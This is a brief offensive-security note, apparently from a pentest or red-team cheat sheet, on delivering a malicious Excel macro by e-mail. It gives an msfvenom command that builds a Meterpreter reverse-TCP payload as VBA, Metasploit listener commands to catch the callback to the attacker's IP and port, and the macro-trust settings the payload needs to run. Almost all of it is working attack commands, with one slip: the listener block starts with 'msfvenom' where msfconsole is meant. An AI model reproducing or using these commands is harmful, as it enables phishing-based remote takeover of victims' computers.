

### Excel Macro Attachment + E-mail Combination
Creating the payload:
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.79.140 LPORT=9999 -f vba`

Initialize listener:

```
msfvenom
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp 
set LHOST 192.168.79.140
set LPORT 9999
set ExitOnSession false
exploit -j
```


Settings to tick off:
- Excel account settings -> trust & security center -> enable macros,
- File explorer -> properties -> unblock file,
- Also macros can now only be triggered in the licensed version of office, active content is not enabled on the free version
